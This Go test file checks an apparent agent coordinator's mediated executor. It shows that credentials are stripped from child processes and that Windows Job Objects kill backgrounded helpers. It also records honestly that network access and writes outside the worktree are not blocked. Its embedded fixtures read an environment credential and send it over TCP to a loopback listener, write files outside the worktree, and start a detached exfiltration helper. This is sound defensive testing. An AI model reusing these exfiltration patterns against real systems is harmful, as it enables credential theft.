package coordinator

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

// pipe133FixtureCredentialName is the fake credential name every test in
// this file sets on the coordinator's own process (t.Setenv) and checks for
// in repository fixture code. It matches minimalEnvironment's
// CODEFLUX_CREDENTIAL_ prefix rule (internal/executor/command.go), so it is
// stripped by the same rule a real provider credential is.
const pipe133FixtureCredentialName = "CODEFLUX_CREDENTIAL_PIPE133_FIXTURE"

// --- PIPE-131: acceptance, adversarial, and mutation route through the ---
// --- mediated executor and its permission policy. ---
//
// Each of the three tests below proves the same shape of thing for one
// stage: repository fixture code that reads the coordinator's own
// environment cannot see a credential when run the way that stage now runs
// it, and — the discrimination every abuse case in this repository is held
// to — the identical program, run the way that stage ran it before PIPE-131
// (a direct exec.Command call inheriting this test process's environment),
// does see it. That inherited-environment comparison is exactly what
// changed: nothing else about how the fixture is invoked differs.

// TestPIPE131_AcceptanceNamedTestRunsThroughTheMediatedBoundary covers the
// checkAcceptance / runNamedTestExamples path.
func TestPIPE131_AcceptanceNamedTestRunsThroughTheMediatedBoundary(t *testing.T) {
	t.Setenv(pipe133FixtureCredentialName, "leaked-fixture-value")
	worktree := testedNamesFixture(t, map[string]string{
		"go.mod":  "module codeflux.test/pipe131/acceptance\n\ngo 1.26.0\n",
		"main.go": "package main\n\nfunc main() {}\n",
		"main_test.go": fmt.Sprintf(`package main

import (
	"os"
	"testing"
)

func TestCredentialIsNotVisible(t *testing.T) {
	if value := os.Getenv(%q); value != "" {
		t.Fatalf("the coordinator's credential reached repository test code: %%q", value)
	}
}
`, pipe133FixtureCredentialName),
	})
	requirement := acceptanceOpen + "\ntest: TestCredentialIsNotVisible\n" + acceptanceClose

	execution := &AgentExecution{}
	outcome, failures := execution.checkAcceptance(t.Context(), worktree, requirement, nil)
	if !outcome.Held || len(failures) != 0 {
		t.Fatalf("the mediated acceptance run saw the coordinator's own "+
			"credential: held=%v detail=%q failures=%v",
			outcome.Held, outcome.Detail, failures)
	}

	// Discrimination: the identical test, run the way this stage ran it
	// before PIPE-131 -- exec.CommandContext inheriting this process's own
	// environment -- does see the credential and fails on it.
	raw := exec.CommandContext(t.Context(), "go", "test", "-count=1",
		"-run", "^TestCredentialIsNotVisible$", "./...")
	raw.Dir = worktree
	output, err := raw.CombinedOutput()
	if err == nil {
		t.Fatalf("fixture assumption broken: an unmediated run of the same "+
			"test did not fail, so this proves nothing about the boundary:\n%s",
			output)
	}
	if !strings.Contains(string(output), "leaked-fixture-value") {
		t.Fatalf("fixture assumption broken: the unmediated run did not "+
			"observe the credential either, so it cannot be the boundary "+
			"making the difference:\n%s", output)
	}
}

// TestPIPE131_AdversarialProbeRunsThroughTheMediatedBoundary covers
// probeProducedCommands / probeOneCommand.
func TestPIPE131_AdversarialProbeRunsThroughTheMediatedBoundary(t *testing.T) {
	t.Setenv(pipe133FixtureCredentialName, "leaked-fixture-value")
	worktree := writeWorktree(t, map[string]string{
		"cmd/probed/main.go": fmt.Sprintf(`package main

import (
	"fmt"
	"os"
)

func main() {
	if value := os.Getenv(%q); value != "" {
		panic("leaked credential: " + value)
	}
	fmt.Println("no credential visible")
}
`, pipe133FixtureCredentialName),
	})
	binaries := t.TempDir()
	binary := filepath.Join(binaries, builtBinaryName("probed"))
	build := exec.CommandContext(t.Context(), "go", "build", "-o", binary, "./cmd/probed")
	build.Dir = worktree
	if output, err := build.CombinedOutput(); err != nil {
		t.Fatalf("the fixture did not build: %v\n%s", err, output)
	}

	execution := &AgentExecution{}
	findings := execution.probeOneCommand(t.Context(), worktree, "./cmd/probed", binary)
	for _, finding := range findings {
		t.Errorf("the mediated adversarial probe reported: %s", finding)
	}

	// Discrimination: the identical built binary, run the way this stage ran
	// it before PIPE-131 -- exec.Command inheriting this process's own
	// environment -- does see the credential and panics on it.
	output, err := exec.CommandContext(t.Context(), binary).CombinedOutput()
	if err == nil {
		t.Fatalf("fixture assumption broken: an unmediated run of the same "+
			"binary did not fail, so this proves nothing about the boundary:\n%s",
			output)
	}
	if !strings.Contains(string(output), "leaked credential: leaked-fixture-value") {
		t.Fatalf("fixture assumption broken: the unmediated run did not "+
			"observe the credential either:\n%s", output)
	}
}

// TestPIPE131_MutationBuildAndSuiteRunThroughTheMediatedBoundary covers
// checkMutations' own worktreeBuilds and suiteRejects.
func TestPIPE131_MutationBuildAndSuiteRunThroughTheMediatedBoundary(t *testing.T) {
	t.Setenv(pipe133FixtureCredentialName, "leaked-fixture-value")
	worktree := writeWorktree(t, map[string]string{
		"lib.go": "package workspace\n\nfunc Noop() {}\n",
		"lib_test.go": fmt.Sprintf(`package workspace

import (
	"os"
	"testing"
)

func TestCredentialIsNotVisible(t *testing.T) {
	if value := os.Getenv(%q); value != "" {
		t.Fatalf("the coordinator's credential reached repository test code: %%q", value)
	}
}
`, pipe133FixtureCredentialName),
	})

	execution := &AgentExecution{}
	if !execution.worktreeBuilds(t.Context(), worktree) {
		t.Fatal("the fixture did not build under the mediated boundary")
	}
	if execution.suiteRejects(t.Context(), worktree) {
		t.Fatal("the mediated mutation suite saw the coordinator's own credential")
	}

	// Discrimination: the same package, tested the way suiteRejects tested
	// it before PIPE-131.
	raw := exec.CommandContext(t.Context(), "go", "test", "-count=1", "./...")
	raw.Dir = worktree
	output, err := raw.CombinedOutput()
	if err == nil {
		t.Fatalf("fixture assumption broken: an unmediated run did not fail, "+
			"so this proves nothing about the boundary:\n%s", output)
	}
	if !strings.Contains(string(output), "leaked-fixture-value") {
		t.Fatalf("fixture assumption broken: the unmediated run did not "+
			"observe the credential either:\n%s", output)
	}
}

// --- PIPE-132: bound what a probed or accepted program may reach. ---
//
// TestPIPE132 proves the one reach-bound the mediated executor actually
// enforces at launch time: a verification command's working directory must
// resolve inside the task worktree, or the command never starts at all.
// This is a real, provable claim, and the abuse case in TestPIPE133 below
// exists precisely because it is a narrower claim than "contains the
// program" -- it bounds where a command is launched from, not what an
// already-running process can go on to open by an absolute path.

// TestPIPE132_MediatedVerificationCommandRefusesToLaunchOutsideTheWorktree
// proves the launch-directory bound PIPE-131's routing depends on.
func TestPIPE132_MediatedVerificationCommandRefusesToLaunchOutsideTheWorktree(t *testing.T) {
	worktree := writeWorktree(t, nil)
	outside := t.TempDir()
	if filepath.Clean(outside) == filepath.Clean(worktree) {
		t.Fatal("fixture assumption broken: the outside directory equals the worktree")
	}

	execution := &AgentExecution{}
	_, err := execution.runMediatedVerificationCommand(
		t.Context(), worktree, outside, "pipe132-escape-probe",
		[]string{"go", "env"}, "", 30*time.Second, nil)
	if err == nil {
		t.Fatal("the mediated boundary launched a verification command " +
			"whose working directory was outside the task worktree")
	}
	if !strings.Contains(err.Error(), "escaped the task worktree") {
		t.Errorf("the refusal did not name the reason: %v", err)
	}

	// Discrimination: the identical command, launched the unmediated way --
	// exec.Command with Dir set directly, no boundary in front of it -- runs
	// successfully outside the worktree. This is what proves the refusal
	// above is the boundary doing something, not the command being
	// unrunnable there for an unrelated reason.
	raw := exec.CommandContext(t.Context(), "go", "env")
	raw.Dir = outside
	if output, err := raw.CombinedOutput(); err != nil {
		t.Fatalf("fixture assumption broken: the command does not even run "+
			"unmediated outside the worktree, so the refusal above proves "+
			"nothing: %v\n%s", err, output)
	}
}

// --- PIPE-133: the abuse case, and what it actually shows. ---
//
// Repository test code attempts, in one fixture, to read a credential, reach
// the network with it, and write a file outside the worktree. The three
// outcomes are NOT uniform, and reporting them as uniform would be exactly
// the unearned "sandboxed" claim AGENTS.md's Security and Authority Rules
// forbid ("Never label workspace confinement as a perfect sandbox"):
//
//   - Reading the credential is refused: minimalEnvironment strips it from
//     the child's environment before the process starts, so there is
//     nothing for the fixture to read.
//   - Reaching the network is NOT refused: nothing in this boundary blocks
//     an outbound socket. The fixture's connection to a loopback listener
//     succeeds in both the mediated and the unmediated run below. What
//     differs is only what is available to send once connected -- an empty
//     string under mediation, the real fixture credential without it.
//   - Writing outside the worktree is NOT refused either: once the process
//     is running, resolveWorktreeFile's confinement (internal/executor's
//     file-tool boundary) does not apply to it -- that boundary mediates
//     the *coordinator's* own file writes on the model's behalf, not an
//     independent OS process's own syscalls. A produced or test program
//     given an absolute path outside the worktree writes to it exactly as
//     it would unmediated, in both runs below.

// TestPIPE133_AbuseCaseCredentialNetworkAndFilesystemEscape is the abuse
// case. It proves the boundary holds for the one thing it actually
// controls (the credential never reaching the child's environment) and
// records, rather than asserting away, the two things it does not control
// (network reachability and writes to an absolute path outside the
// worktree).
func TestPIPE133_AbuseCaseCredentialNetworkAndFilesystemEscape(t *testing.T) {
	t.Setenv(pipe133FixtureCredentialName, "leaked-fixture-value")

	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("could not open the loopback listener the fixture dials: %v", err)
	}
	defer listener.Close()
	address := listener.Addr().String()

	acceptOnePayload := func() <-chan string {
		result := make(chan string, 1)
		go func() {
			connection, acceptErr := listener.Accept()
			if acceptErr != nil {
				result <- ""
				return
			}
			defer connection.Close()
			_ = connection.SetReadDeadline(time.Now().Add(20 * time.Second))
			payload, _ := io.ReadAll(connection)
			result <- string(payload)
		}()
		return result
	}

	outsideRoot := t.TempDir()
	mediatedOutside := filepath.Join(outsideRoot, "mediated")
	rawOutside := filepath.Join(outsideRoot, "raw")
	for _, directory := range []string{mediatedOutside, rawOutside} {
		if err := os.MkdirAll(directory, 0o750); err != nil {
			t.Fatal(err)
		}
	}

	fixtureSource := func(outsidePath string) string {
		return fmt.Sprintf(`package abuse

import (
	"net"
	"os"
	"path/filepath"
	"testing"
	"time"
)

// TestAttemptsCredentialNetworkAndFilesystemEscape is repository test code:
// it plays the part of an untrusted TestMain/init/test function that tries
// to read a credential, exfiltrate it over the network, and write a file
// outside the worktree it was given.
func TestAttemptsCredentialNetworkAndFilesystemEscape(t *testing.T) {
	credential := os.Getenv(%q)

	connection, dialErr := net.DialTimeout("tcp", %q, 5*time.Second)
	if dialErr == nil {
		_ = connection.SetWriteDeadline(time.Now().Add(5 * time.Second))
		_, _ = connection.Write([]byte(credential))
		connection.Close()
	} else {
		t.Logf("network dial failed: %%v", dialErr)
	}

	target := filepath.Join(%q, "leak.txt")
	if err := os.WriteFile(target, []byte("escaped\n"), 0o600); err != nil {
		t.Logf("write outside the worktree failed: %%v", err)
	}
}
`, pipe133FixtureCredentialName, address, outsidePath)
	}

	// --- The mediated run: this stage's real production path. ---
	mediatedWorktree := testedNamesFixture(t, map[string]string{
		"go.mod":        "module codeflux.test/pipe133/abuse\n\ngo 1.26.0\n",
		"main.go":       "package abuse\n",
		"abuse_test.go": fixtureSource(mediatedOutside),
	})
	mediatedPayload := acceptOnePayload()
	execution := &AgentExecution{}
	passed, failures := execution.runNamedTestExamples(t.Context(), mediatedWorktree,
		[]namedTestExample{
			{Package: "./...", Name: "TestAttemptsCredentialNetworkAndFilesystemEscape"},
		})
	if len(failures) != 0 || len(passed) != 1 {
		t.Fatalf("the abuse fixture itself did not run cleanly: passed=%v failures=%v",
			passed, failures)
	}

	var mediatedNetworkPayload string
	select {
	case mediatedNetworkPayload = <-mediatedPayload:
	case <-time.After(25 * time.Second):
		t.Fatal("the mediated fixture never reached the loopback listener at all")
	}

	// Refused: the credential is not in the child's environment, so there is
	// nothing to exfiltrate.
	if mediatedNetworkPayload != "" {
		t.Fatalf("REFUSAL FAILED: the mediated run exfiltrated a credential "+
			"over the network: %q", mediatedNetworkPayload)
	}
	// NOT refused: the network was still reachable -- the connection above
	// completed, it simply carried nothing worth stealing.
	t.Log("recorded: network reach was NOT refused; the connection to the " +
		"loopback listener succeeded under mediation")

	// NOT refused: the file outside the worktree was still written.
	mediatedLeak := filepath.Join(mediatedOutside, "leak.txt")
	content, readErr := os.ReadFile(mediatedLeak)
	if readErr != nil {
		t.Fatalf("expected the fixture's write outside the worktree to "+
			"succeed (this boundary does not confine it) so this test's own "+
			"read-back could record that fact, but the read failed: %v", readErr)
	}
	if strings.TrimSpace(string(content)) != "escaped" {
		t.Fatalf("outside-worktree file content = %q, want the fixture's "+
			"marker", content)
	}
	t.Log("recorded: the write outside the worktree was NOT refused")

	// --- Discrimination: the identical fixture, run the way this stage ran
	// it before PIPE-131 -- exec.Command inheriting this test process's own
	// environment, including the fake credential set above.
	rawWorktree := testedNamesFixture(t, map[string]string{
		"go.mod":        "module codeflux.test/pipe133/abuse-raw\n\ngo 1.26.0\n",
		"main.go":       "package abuse\n",
		"abuse_test.go": fixtureSource(rawOutside),
	})
	rawPayload := acceptOnePayload()
	raw := exec.CommandContext(t.Context(), "go", "test", "-count=1",
		"-run", "^TestAttemptsCredentialNetworkAndFilesystemEscape$", "./...")
	raw.Dir = rawWorktree
	if output, err := raw.CombinedOutput(); err != nil {
		t.Fatalf("the unmediated fixture did not run cleanly: %v\n%s", err, output)
	}

	var rawNetworkPayload string
	select {
	case rawNetworkPayload = <-rawPayload:
	case <-time.After(25 * time.Second):
		t.Fatal("the unmediated fixture never reached the loopback listener at all")
	}
	if rawNetworkPayload != "leaked-fixture-value" {
		t.Fatalf("fixture assumption broken: the unmediated run did not "+
			"exfiltrate the credential either (%q), so it cannot be the "+
			"boundary making the difference for the credential specifically",
			rawNetworkPayload)
	}

	rawLeak := filepath.Join(rawOutside, "leak.txt")
	if _, err := os.Stat(rawLeak); err != nil {
		t.Fatalf("fixture assumption broken: the unmediated run's write "+
			"outside the worktree did not even succeed, so the mediated "+
			"run's identical write proves nothing about the boundary: %v", err)
	}
}

// --- PIPE-132a / PIPE-133a: what the Job Object confinement added in
// internal/executor/process_windows.go actually refuses, and what it does
// not. ---
//
// PIPE-133a asked to turn the two `recorded: ... NOT refused` observations
// logged above into assertions once PIPE-132a provided something to refuse
// with. Having built that mechanism, the honest answer is that it cannot:
// both the network write and the filesystem write above happen
// synchronously, inside TestAttemptsCredentialNetworkAndFilesystemEscape's
// own still-running process, before runNamedTestExamples's mediated call is
// ever done with the command. A Windows Job Object bounds what is still
// running once the mediated call closes it -- it has no bearing on syscalls
// a process makes while it is the one thing mediation is still waiting on.
// There is no mechanism anywhere in this codebase that intercepts a
// syscall in flight; a Job Object is process-lifetime and process-tree
// containment, not a network filter or a filesystem ACL. Both log lines
// above are therefore left exactly as they were: recordings of a real,
// named limit, not assertions of a containment this boundary does not
// have.
//
// What PIPE-132a's mechanism does refuse, in the same abuse-case family, is
// below: a detached helper that deliberately does NOT block the mediated
// command's own exit, betting that it can keep running -- and keep trying
// the same credential/network/filesystem escape -- after mediation has
// moved on. That bet fails under mediation and succeeds unmediated, which
// is exactly the shape of evidence this file already holds every other
// PIPE-13x claim to.

// TestPIPE133a_ConfinementKillsABackgroundedExfiltrationAttemptAfterSuccess
// extends the PIPE-133 abuse case with the one dimension PIPE-132a's Job
// Object confinement actually closes: a helper process the abuse fixture
// starts and does not wait for, so that the fixture's own test function --
// and therefore the mediated `go test` process runNamedTestExamples is
// waiting on -- returns successfully while the helper is still running.
// Windows-only: processConfinement is a no-op on every other platform (see
// internal/executor/process_unix.go), so this fixture would show the
// backgrounded helper surviving under mediation there too, proving nothing
// platform-specific.
func TestPIPE133a_ConfinementKillsABackgroundedExfiltrationAttemptAfterSuccess(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("PIPE-132a confinement is a Windows Job Object mechanism; " +
			"see internal/executor/process_unix.go")
	}

	// The mediated and raw phases each get their own listener rather than
	// sharing one. Unlike TestPIPE133 above -- where the dial always
	// succeeds under mediation too, so the mediated Accept() call is always
	// consumed -- this test expects the mediated dial to never happen at
	// all. A shared listener would leave the mediated phase's Accept()
	// permanently parked waiting for a connection that never arrives, and
	// that stray goroutine would then race the raw phase's own Accept() for
	// the raw helper's connection, non-deterministically stealing it.
	newListener := func() (address string, acceptOnePayload func() <-chan string) {
		listener, listenErr := net.Listen("tcp", "127.0.0.1:0")
		if listenErr != nil {
			t.Fatalf("could not open the loopback listener the fixture dials: %v", listenErr)
		}
		t.Cleanup(func() { _ = listener.Close() })
		return listener.Addr().String(), func() <-chan string {
			result := make(chan string, 1)
			go func() {
				connection, acceptErr := listener.Accept()
				if acceptErr != nil {
					result <- ""
					return
				}
				defer connection.Close()
				_ = connection.SetReadDeadline(time.Now().Add(20 * time.Second))
				payload, _ := io.ReadAll(connection)
				result <- string(payload)
			}()
			return result
		}
	}
	mediatedAddress, acceptMediatedPayload := newListener()
	rawAddress, acceptRawPayload := newListener()

	outsideRoot := t.TempDir()
	mediatedOutside := filepath.Join(outsideRoot, "mediated")
	rawOutside := filepath.Join(outsideRoot, "raw")
	for _, directory := range []string{mediatedOutside, rawOutside} {
		if err := os.MkdirAll(directory, 0o750); err != nil {
			t.Fatal(err)
		}
	}

	// The detached helper is a separate compiled binary, not a re-exec of
	// the test binary itself: go test deletes its own compiled test binary
	// as soon as the test process exits, and a still-running process
	// holding that exact file open makes that delete fail with "Access is
	// denied" on Windows -- a Windows file-locking fact, not a confinement
	// effect, and it would corrupt this test's result either way. Building
	// a distinct artifact for the helper to run keeps the thing this test
	// actually measures -- whether the helper survives to act -- isolated
	// from that unrelated file-locking behavior.
	const helperSource = `package main

import (
	"net"
	"os"
	"path/filepath"
	"time"
)

// A detached helper the abuse-case test starts and never waits for. It
// sleeps briefly, then makes the same two attempts PIPE-133's synchronous
// abuse case makes -- reach the network, write outside the worktree -- just
// asynchronously, betting mediation is done deciding the command has
// finished before this runs.
func main() {
	time.Sleep(2 * time.Second)
	address, outsideDir := os.Args[1], os.Args[2]
	if connection, dialErr := net.DialTimeout("tcp", address, 5*time.Second); dialErr == nil {
		_, _ = connection.Write([]byte("backgrounded-exfiltration"))
		connection.Close()
	}
	_ = os.WriteFile(filepath.Join(outsideDir, "background-leak.txt"),
		[]byte("escaped-in-background\n"), 0o600)
}
`

	// The helper binary is built to a path this outer test owns and cleans
	// up itself (outsideRoot, removed via t.TempDir() much later), never to
	// a t.TempDir() registered inside the fixture: that cleanup runs
	// synchronously the instant the fixture's own test function returns --
	// exactly the moment the helper has just been started and is
	// guaranteed to still be running -- and RemoveAll on a directory
	// holding an in-use exe fails with the same "Access is denied" this
	// comment already ruled out above, this time from testing.T's own
	// cleanup rather than go test's.
	fixtureSource := func(outsidePath, binaryPath, address string) string {
		return fmt.Sprintf(`package abuse

import (
	"os/exec"
	"testing"
)

// TestAttemptsToOutliveMediationWithABackgroundExfiltrator builds the
// detached helper binary and starts it without waiting for it, the way the
// synchronous PIPE-133 abuse case deliberately does not: this attempt is
// asynchronous on purpose, betting that mediation is done deciding the
// command has finished before the helper gets around to acting.
func TestAttemptsToOutliveMediationWithABackgroundExfiltrator(t *testing.T) {
	build := exec.Command("go", "build", "-o", %q, "./cmd/helper")
	if output, err := build.CombinedOutput(); err != nil {
		t.Fatalf("could not build the background helper: %%v\n%%s", err, output)
	}
	child := exec.Command(%q, %q, %q)
	if err := child.Start(); err != nil {
		t.Fatalf("could not start the background helper: %%v", err)
	}
	// Deliberately not waiting: this test, and the mediated go test process
	// running it, exit here while the helper is still starting.
}
`, binaryPath, binaryPath, address, outsidePath)
	}

	mediatedBinary := filepath.Join(outsideRoot, "mediated-helper.exe")
	rawBinary := filepath.Join(outsideRoot, "raw-helper.exe")

	// --- The mediated run. ---
	mediatedWorktree := testedNamesFixture(t, map[string]string{
		"go.mod":             "module codeflux.test/pipe133a/background\n\ngo 1.26.0\n",
		"main.go":            "package abuse\n",
		"abuse_test.go":      fixtureSource(mediatedOutside, mediatedBinary, mediatedAddress),
		"cmd/helper/main.go": helperSource,
	})
	mediatedPayload := acceptMediatedPayload()
	execution := &AgentExecution{}
	// Package is scoped to "." rather than "./...": the module also
	// contains cmd/helper, a plain package main with no test file of its
	// own, and go test prints "no test files" for it when the pattern
	// covers the whole module -- text runNamedTestExamples treats as
	// evidence nothing ran (PIPE-118's guard against a misspelled name
	// matching nothing), which would misreport this fixture as broken
	// rather than proving anything about confinement.
	passed, failures := execution.runNamedTestExamples(t.Context(), mediatedWorktree,
		[]namedTestExample{
			{Package: ".", Name: "TestAttemptsToOutliveMediationWithABackgroundExfiltrator"},
		})
	if len(failures) != 0 || len(passed) != 1 {
		t.Fatalf("the background-exfiltrator fixture itself did not run cleanly: "+
			"passed=%v failures=%v", passed, failures)
	}

	// Give the backgrounded helper (2s sleep before it acts) comfortably
	// longer than it would need to complete both escape attempts if nothing
	// stopped it.
	time.Sleep(6 * time.Second)

	select {
	case payload := <-mediatedPayload:
		t.Fatalf("REFUSAL FAILED: the backgrounded helper reached the network "+
			"under mediation after the mediated command had already finished: %q",
			payload)
	default:
		// Refused: no connection ever arrived, because the helper was
		// terminated before it dialed.
	}

	mediatedLeak := filepath.Join(mediatedOutside, "background-leak.txt")
	if _, statErr := os.Stat(mediatedLeak); !os.IsNotExist(statErr) {
		t.Fatalf("REFUSAL FAILED: the backgrounded helper's write outside the "+
			"worktree survived under mediation (stat err = %v)", statErr)
	}

	// --- Discrimination: the identical fixture, run the way this stage ran
	// it before PIPE-131 -- exec.Command inheriting this test process's own
	// environment, with no confinement in front of it at all.
	rawWorktree := testedNamesFixture(t, map[string]string{
		"go.mod":             "module codeflux.test/pipe133a/background-raw\n\ngo 1.26.0\n",
		"main.go":            "package abuse\n",
		"abuse_test.go":      fixtureSource(rawOutside, rawBinary, rawAddress),
		"cmd/helper/main.go": helperSource,
	})
	rawPayload := acceptRawPayload()
	raw := exec.CommandContext(t.Context(), "go", "test", "-count=1",
		"-run", "^TestAttemptsToOutliveMediationWithABackgroundExfiltrator$", "./...")
	raw.Dir = rawWorktree
	if output, err := raw.CombinedOutput(); err != nil {
		t.Fatalf("the unmediated fixture did not run cleanly: %v\n%s", err, output)
	}

	var rawNetworkPayload string
	select {
	case rawNetworkPayload = <-rawPayload:
	case <-time.After(20 * time.Second):
		t.Fatal("fixture assumption broken: the unmediated backgrounded helper " +
			"never reached the loopback listener either, so this proves nothing " +
			"about confinement")
	}
	if rawNetworkPayload != "backgrounded-exfiltration" {
		t.Fatalf("fixture assumption broken: the unmediated backgrounded helper "+
			"did not send its expected payload either (%q)", rawNetworkPayload)
	}

	rawLeak := filepath.Join(rawOutside, "background-leak.txt")
	deadline := time.Now().Add(10 * time.Second)
	for {
		if _, err := os.Stat(rawLeak); err == nil {
			break
		} else if time.Now().After(deadline) {
			t.Fatalf("fixture assumption broken: the unmediated backgrounded "+
				"helper's write outside the worktree did not even survive, so "+
				"the mediated refusal above proves nothing about confinement: %v",
				err)
		}
		time.Sleep(100 * time.Millisecond)
	}
}
